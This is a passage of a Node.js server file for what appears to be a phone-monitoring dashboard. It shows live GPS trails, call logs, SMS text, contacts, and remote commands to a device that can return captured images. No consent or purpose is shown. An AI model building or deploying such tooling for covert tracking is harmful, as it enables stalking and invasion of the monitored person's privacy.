$('applyHistory').addEventListener('click', loadHistory);
$('liveBtn').addEventListener('click', returnToLive);
$('matchBtn').addEventListener('click', matchRoads);

function searchPlace() {
  var q = $('place').value.trim(); if (!q) return;
  $('searchStatus').textContent = 'Searching...';
  fetch('https://nominatim.openstreetmap.org/search?format=jsonv2&limit=1&q='+encodeURIComponent(q))
    .then(function(r){ return r.json(); }).then(function(results){
      if (!results.length) { $('searchStatus').textContent = 'Not found.'; return; }
      var place = results[0]; var lat=Number(place.lat), lng=Number(place.lon);
      if (searchMark) map.removeLayer(searchMark);
      searchMark = L.marker([lat,lng]).addTo(map).bindPopup(esc(place.display_name)).openPopup();
      map.setView([lat,lng],14); $('searchStatus').textContent = place.display_name;
    }).catch(function(){ $('searchStatus').textContent = 'Search failed.'; });
}
$('searchBtn').addEventListener('click', searchPlace);
$('place').addEventListener('keydown', function(e){ if(e.key==='Enter')searchPlace(); });

// MONITOR
function loadMonitorData() {
  fetch('/monitor-data').then(function(r){ return r.json(); }).then(function(data){
    if (data.calls && data.calls.length) renderCalls(data.calls);
    if (data.sms && data.sms.length) renderSms(data.sms);
    if (data.contacts && data.contacts.length) renderContacts(data.contacts);
  }).catch(function(e){ console.error('Monitor load failed:', e); });
}
socket.on('monitorUpdate', function(payload){
  if (payload.type === 'calls') renderCalls(payload.data);
  if (payload.type === 'sms') renderSms(payload.data);
  if (payload.type === 'contacts') renderContacts(payload.data);
});
function renderCalls(calls) {
  var types = ['','Incoming','Outgoing','Missed'];
  $('callPanel').innerHTML = calls.slice(0,20).map(function(c){
    return '<div style="padding:8px 0;border-bottom:1px solid var(--border)">'+
      '<span style="color:#edf4ff">'+esc(c.number)+'</span>'+
      '<span style="color:var(--muted);margin-left:10px">'+(types[c.type]||'Unknown')+'</span>'+
      '<span style="color:var(--muted);margin-left:10px">'+c.duration+'s</span>'+
      '<span style="color:var(--muted);margin-left:10px;font-size:11px">'+new Date(c.date).toLocaleString()+'</span></div>';
  }).join('') || 'No calls.';
}
function renderSms(list) {
  $('smsPanel').innerHTML = list.slice(0,20).map(function(s){
    return '<div style="padding:8px 0;border-bottom:1px solid var(--border)">'+
      '<b style="color:#edf4ff">'+esc(s.address)+'</b>'+
      '<span style="color:var(--muted);margin-left:8px;font-size:11px">'+new Date(s.date).toLocaleString()+'</span>'+
      '<div style="color:var(--muted);font-size:12px;margin-top:4px">'+esc((s.body||'').substring(0,80))+'</div></div>';
  }).join('') || 'No SMS.';
}
function renderContacts(contacts) {
  $('contactCount').textContent = contacts.length;
  $('contactPanel').innerHTML = contacts.slice(0,50).map(function(c){
    return '<span style="display:inline-block;background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:5px 10px;margin:3px;font-size:12px">'+esc(c.name)+' '+esc(c.number)+'</span>';
  }).join('') || 'No contacts.';
}

// COMMANDS
var cmdLog = [];
function sendCmd(action) {
  var deviceId = $('deviceIdCmd').value.trim() || 'default';
  $('cmdResult').textContent = 'Sending ' + action + ' to ' + deviceId + '...';
  $('cmdImage').style.display = 'none';
  fetch('/command', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({action: action, deviceId: deviceId})
  }).then(function(r){ return r.json(); }).then(function(data){
    $('cmdResult').textContent = 'Sent. ID: '+(data.command&&data.command.id)+'\\nWaiting for device...';
    cmdLog.unshift({time:new Date().toLocaleTimeString(), action:action, result:'Queued'});
    renderCmdHist();
  }).catch(function(e){ $('cmdResult').textContent = 'Failed: '+e.message; });
}
socket.on('commandResult', function(result){
  var text = 'Command: '+result.commandId+'\\nResult: '+result.result;
  if (result.data) text += '\\nData: '+JSON.stringify(result.data, null, 2);
  $('cmdResult').textContent = text;
  if (result.data && result.data.imageBase64) {
    $('cmdImage').src = 'data:image/jpeg;base64,'+result.data.imageBase64;
    $('cmdImage').style.display = 'block';
  }
  cmdLog.unshift({time:new Date().toLocaleTimeString(), action:'result', result:result.result});
  renderCmdHist();
});
function renderCmdHist() {
  $('cmdHistory').innerHTML = cmdLog.slice(0,15).map(function(c){
    return '<tr><td>'+c.time+'</td><td>'+esc(c.action)+'</td><td class="green">'+esc(c.result)+'</td></tr>';
  }).join('') || '<tr><td colspan="3">No commands yet</td></tr>';
}

// INITIAL LOAD
(function() {
  fetch('/history?limit=2000&deviceId=default').then(function(r){ return r.json(); }).then(function(data){
    if (Array.isArray(data)) {
      allPoints = data.filter(validPt).map(function(p){ return Object.assign({},p,{latitude:Number(p.latitude),longitude:Number(p.longitude)}); });
      drawTrail(allPoints);
      if (allPoints.length) {
        latest = allPoints[allPoints.length-1];
        updateMetrics(latest); updateMarker(latest);
        map.setView([latest.latitude, latest.longitude], 15);
      }
    }
  }).catch(function(){ $('mapStatus').textContent = 'History load failed. Waiting for live GPS.'; });
})();
</script>
</body>
</html>`;
}

app.get('/', (req, res) => { res.redirect('/dashboard'); });

app.use((err, req, res, next) => {
    console.error('Unhandled error:', err.message);
    if (res.headersSent) return next(err);
    res.status(500).json({ message: 'Internal server error.' });
});

server.listen(PORT, '0.0.0.0', () => { console.log('Server running on port ' + PORT); });

async function shutdown() {
    server.close(async () => {
        try { if (pool) await pool.end(); } catch {}
        process.exit(0);
    });
    setTimeout(() => process.exit(1), 10000).unref();
}
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);
